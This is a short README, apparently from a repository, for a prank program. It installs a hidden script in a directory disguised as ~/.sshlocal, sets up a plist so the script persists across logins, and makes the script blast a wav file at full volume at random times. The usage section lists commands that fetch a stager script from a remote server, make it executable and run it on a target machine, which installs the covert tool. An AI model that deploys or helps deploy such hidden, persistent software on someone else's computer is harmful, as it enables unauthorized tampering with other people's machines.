## Intro
Hi! This program was developed to settle a score between friendly rivles. I hope you will not use it maliciously. 90% of development was done on a saturday afternoon, so there are probably lots of bugs. feel free to create an issue, or better yet, fix it and create a Pull Request.

## What does this program do?
This program creates a covert directory called ~/.sshlocal. In this directory is a python script that takes over the computers volume and plays a wav file as loud as possible (100%).
The installer will also create a plist file, and place it in the correct directory so that the script will execute on machine restart or logout/login. It also randomly plays the wav file once every 0-6 hours.
## Installation

## Usage
For now, this program is intended to be run on a target machine you have physical access to. On that machine run:

`curl -O https://server-hosting-the-files/stager.sh`  
`chmod +x stager.sh`
`./stager.sh`
Srager.sh will handle the install process, pulling down the zip files, and run the installer.
